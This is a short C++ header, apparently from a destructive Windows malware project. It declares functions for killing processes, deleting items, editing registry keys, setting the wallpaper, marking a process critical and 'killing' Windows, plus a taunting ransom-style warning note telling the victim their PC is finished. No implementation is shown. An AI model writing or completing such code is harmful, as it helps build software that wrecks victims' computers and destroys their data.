#pragma once

#include <Windows.h>

namespace main {
	inline constexpr const wchar_t* WARNING_NOTE = L"your pc is fucked\nno one will help you\nno one can help you\n\nenjoy your last moments using your pc";

	void note();
	void wallpaper();
	void critical();
	void reg_keys();
	void kill_windows();

	void kill_all_t();
	void del_items_t();
	void beep_t();
}